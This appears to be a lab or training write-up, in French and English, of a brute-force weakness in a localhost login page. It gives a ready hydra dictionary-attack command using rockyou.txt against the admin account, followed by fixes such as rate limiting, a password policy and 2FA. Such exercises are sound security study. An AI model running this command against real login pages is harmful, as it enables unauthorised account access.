# Définition de bruteforce

A brute force attack is a trial-and-error process used to guess credentials (IDs/passwords or encryption keys) in order to gain unauthorised access to a system. It involves starting with one login and trying several password combinations or, conversely, using several logins against one password.

# vulnerabilite

si on bruteforce la page avec un dictionary attacks `http://localhost:8080/index.php?page=signin` avec un tools comme hydra et une liste de motdepasse comme rockyou.txt, quand on lance le tools avec un script on se log facilement, car le mot de passe est pas securise

# command

`hydra -l admin -P rockyou.txt localhost http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif`

# risk

se connecter au site

# fix

mettre un rate limiter / meilleur password policy
 / 2fa
